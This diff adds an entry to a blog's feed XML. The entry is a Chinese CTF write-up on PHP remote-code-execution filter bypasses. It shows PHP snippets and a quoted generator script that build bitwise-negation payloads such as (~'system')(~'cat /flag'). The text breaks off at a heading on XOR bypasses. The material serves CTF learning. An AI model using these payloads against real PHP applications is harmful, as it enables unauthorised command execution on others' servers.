@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>ctfRCE篇</title>
+      <link href="/2023/12/07/ctfRCE%E7%AF%87/"/>
+      <url>/2023/12/07/ctfRCE%E7%AF%87/</url>
+      
+        <content type="html"><![CDATA[<h1 id="CTF-RCE"><a href="#CTF-RCE" class="headerlink" title="# CTF RCE"></a># CTF RCE</h1><h2 id="常见CTF-RCE类型"><a href="#常见CTF-RCE类型" class="headerlink" title="常见CTF RCE类型"></a>常见CTF RCE类型</h2><ol><li>无参数类型</li><li>无字母类型绕过(异或，自增，取反)</li><li>关键字绕过</li></ol><h3 id="无字母类型-取反绕过"><a href="#无字母类型-取反绕过" class="headerlink" title="无字母类型(取反绕过)"></a>无字母类型(取反绕过)</h3><p>例题：</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072248710.png"></p><p>代码中 异或 和字母都被过滤掉了 这种情况下可以使用取反来绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;system(&quot;</span>ls<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是整个取反行不通，看了下评论区说是括号干扰。</p><p>只能函数和参数分开取反</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先用这个查看 跟下有没有flag文件(一般flag都在根下)</p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072316272.png"></p><p>这里要用括号然后再用取反符还原即可。看见了flag文件</p><p>再把上面的代码改下即可</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flllllaaaaaaggggggg&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072319920.png"></p><p>附上大佬的取反脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202312072325409.png"></p><h3 id="无字母RCE-异或"><a href="#无字母RCE-异或" class="headerlink" title="无字母RCE 异或"></a>无字母RCE 异或</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>burp+xray联动漏扫</title>
       <link href="/2023/12/01/burp+xray%E8%81%94%E5%8A%A8%E6%BC%8F%E6%89%AB/"/>
       <url>/2023/12/01/burp+xray%E8%81%94%E5%8A%A8%E6%BC%8F%E6%89%AB/</url>
